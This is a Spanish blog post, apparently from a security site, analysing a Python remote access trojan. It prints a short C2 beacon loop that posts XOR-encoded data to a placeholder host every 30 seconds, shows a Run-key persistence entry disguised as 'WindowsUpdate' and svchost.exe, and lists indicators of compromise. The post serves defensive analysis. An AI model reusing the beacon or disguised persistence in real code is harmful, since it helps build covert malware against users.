---
title: "Análisis de RAT escrito en Python 2"
date: 2024-11-20
draft: false
description: "Diseccionando un troyano de acceso remoto: comunicación C2, persistencia y evasión de antivirus."
cover: "/images/posts/rat-analysis.png"
categories: ["Malware"]
tags: ["rat", "python", "reverse", "c2", "malware"]
readtime: "15"
featured: false
---

## Muestra analizada

Hash SHA256: `a1b2c3d4e5f6...` — capturado en entorno sandbox aislado.

## Comunicación C2

El RAT utiliza HTTP sobre puerto 8080 con cifrado XOR básico:

```python
def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# Beacon al C2 cada 30 segundos
import time, requests
while True:
    r = requests.post("http://c2.malicious.example/beacon",
                      data=xor_encrypt(b"alive", b"secret"))
    time.sleep(30)
```

## Mecanismo de persistencia

Añade una clave de registro en Windows:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
"WindowsUpdate" = "C:\Users\victim\AppData\Roaming\svchost.exe"
```

## IOCs

| Tipo | Valor |
|------|-------|
| IP C2 | 192.168.x.x |
| Puerto | 8080 |
| User-Agent | `Mozilla/4.0 (compatible)` |
| Mutex | `Global\MutexRAT2024` |

## Conclusión

A pesar de su simplicidad, este RAT logra evadir varios antivirus gracias al XOR y al uso de nombres de proceso legítimos.
